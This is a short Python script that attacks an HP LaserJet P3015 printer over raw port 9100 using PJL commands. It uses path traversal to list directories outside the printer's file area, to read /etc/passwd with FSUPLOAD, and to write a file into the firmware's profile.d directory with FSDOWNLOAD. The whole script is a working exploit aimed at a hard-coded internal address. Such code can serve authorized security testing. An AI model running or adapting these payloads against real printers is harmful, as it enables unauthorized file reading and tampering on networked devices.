# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

# Test the HP LaserJet P3015 printer

import socket
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#server_address = (sys.argv[1], int(sys.argv[2]))
#print 'connecting to %s port %s' % server_address
server_address = ('172.30.4.20',9100)
sock.connect(server_address)

def getinfo():
    dict = {"printer":"@PJL INFO ID\r\n",
            "current dir":'@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=1024\r\n',
            "dir travel":'@PJL FSDIRLIST NAME="0:/../../" ENTRY=1 COUNT=1024\r\n',
            "password":'@PJL FSUPLOAD NAME="../../etc/passwd" OFFSET=0 SIZE=648\r\n',
            }
    for key in dict.keys():
        sock.sendall(dict.get(key)) #"\r\n" is required, or the command will not be executed!!!!
        #sock.send('\r\n')
        data = sock.recv(1024)
        print data



def writingtest():
    test = ('test')
    dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(test)) + ' NAME="0:/../../rw/var/etc/profile.d/writing_test"\r\n'
    dir_query += test
    dir_query += '\x1b%-12345X'
    sock.sendall(dir_query)